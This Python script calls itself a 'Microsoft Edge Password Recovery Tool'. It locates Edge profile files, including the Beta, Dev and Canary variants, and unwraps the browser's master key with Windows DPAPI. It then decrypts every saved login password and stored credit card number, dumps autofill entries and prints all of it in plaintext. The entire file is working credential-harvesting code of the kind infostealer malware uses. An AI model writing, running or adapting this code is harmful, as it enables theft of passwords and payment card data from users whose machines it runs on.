import os
import json
import base64
import sqlite3
import win32crypt  # Requires pywin32 module
from Crypto.Cipher import AES  # Requires pycryptodome module

def get_edge_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state_data = json.load(file)
    encrypted_key_b64 = local_state_data['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(ciphertext, master_key):
    nonce, cipherbytes_tag = ciphertext[3:15], ciphertext[15:]  # Remove 'v10' prefix
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    decrypted_pass = cipher.decrypt_and_verify(cipherbytes_tag[:-16], cipherbytes_tag[-16:])
    return decrypted_pass.decode()

def get_table_exists(cursor, table_name):
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
    return cursor.fetchone() is not None

def get_edge_logins(login_data_path, master_key):
    conn = sqlite3.connect(login_data_path)
    cursor = conn.cursor()
    if not get_table_exists(cursor, 'logins'):
        conn.close()
        return []
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    logins = cursor.fetchall()
    conn.close()
    
    decrypted_logins = []
    for origin_url, username, password_value in logins:
        if password_value:
            try:
                decrypted_password = decrypt_password(password_value, master_key)
                decrypted_logins.append((origin_url, username, decrypted_password))
            except Exception as e:
                print(f"Failed to decrypt password for {origin_url}: {e}")
    
    return decrypted_logins

def get_edge_autofill(web_data_path):
    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    if not get_table_exists(cursor, 'autofill'):
        conn.close()
        return []
    cursor.execute('SELECT name, value FROM autofill')
    autofill_entries = cursor.fetchall()
    conn.close()
    return autofill_entries

def get_edge_payment_data(web_data_path, master_key):
    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    if not get_table_exists(cursor, 'credit_cards'):
        print("The 'credit_cards' table does not exist.")
        conn.close()
        return []
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
    payment_data = cursor.fetchall()
    conn.close()
    
    if not payment_data:
        print("No payment data found in the 'credit_cards' table.")
        return []

    decrypted_payments = []
    for name_on_card, exp_month, exp_year, card_number_encrypted in payment_data:
        if card_number_encrypted:
            try:
                decrypted_card_number = decrypt_password(card_number_encrypted, master_key)
                decrypted_payments.append((name_on_card, exp_month, exp_year, decrypted_card_number))
            except Exception as e:
                print(f"Failed to decrypt card number for {name_on_card}: {e}")
    
    return decrypted_payments

def main():
    user_home = os.path.expanduser("~")
    
    # Edge paths (updated from Chrome paths)
    local_state_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge\User Data\Local State")
    login_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data")
    web_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge\User Data\Default\Web Data")
    
    # Check for Edge Beta/Dev/Canary paths if standard Edge not found
    if not os.path.isfile(local_state_path):
        # Try Edge Beta
        local_state_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Beta\User Data\Local State")
        login_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Beta\User Data\Default\Login Data")
        web_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Beta\User Data\Default\Web Data")
        
        if not os.path.isfile(local_state_path):
            # Try Edge Dev
            local_state_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Dev\User Data\Local State")
            login_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Dev\User Data\Default\Login Data")
            web_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Dev\User Data\Default\Web Data")
            
            if not os.path.isfile(local_state_path):
                # Try Edge Canary
                local_state_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Canary\User Data\Local State")
                login_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Canary\User Data\Default\Login Data")
                web_data_path = os.path.join(user_home, r"AppData\Local\Microsoft\Edge Canary\User Data\Default\Web Data")
    
    if not os.path.isfile(local_state_path):
        print(f"Local State file not found for Edge. Tried all Edge variants.")
        return

    if not os.path.isfile(login_data_path):
        print(f"Login Data file not found at: {login_data_path}")
        return

    if not os.path.isfile(web_data_path):
        print(f"Web Data file not found at: {web_data_path}")
        return
    
    try:
        master_key = get_edge_master_key(local_state_path)
    except Exception as e:
        print(f"Failed to retrieve master key: {e}")
        return
    
    try:
        logins = get_edge_logins(login_data_path, master_key)
        autofill = get_edge_autofill(web_data_path)
        payments = get_edge_payment_data(web_data_path, master_key)
    except Exception as e:
        print(f"Failed to retrieve data: {e}")
        return
    
    print("\n" + "="*50)
    print("EDGE BROWSER DATA")
    print("="*50)
    
    print("\n📝 LOGINS:")
    if logins:
        for origin_url, username, password in logins:
            print(f"  URL: {origin_url}")
            print(f"  Username: {username}")
            print(f"  Password: {password}\n")
    else:
        print("  No logins found.\n")
    
    print("\n🔧 AUTOFILL:")
    if autofill:
        for name, value in autofill:
            print(f"  Name: {name}")
            print(f"  Value: {value}\n")
    else:
        print("  No autofill entries found.\n")
    
    print("\n💳 PAYMENT DATA:")
    if payments:
        for name_on_card, exp_month, exp_year, card_number in payments:
            print(f"  Name on Card: {name_on_card}")
            print(f"  Expiration Month: {exp_month}")
            print(f"  Expiration Year: {exp_year}")
            print(f"  Card Number: {card_number}\n")
    else:
        print("  No payment data found.\n")

if __name__ == "__main__":
    print("Microsoft Edge Password Recovery Tool")
    print("="*50)
    print("Note: This tool requires Edge to be closed to access the databases.")
    print("="*50)
    input("\nPress Enter to continue...")
    main()
    input("\nPress Enter to exit...")
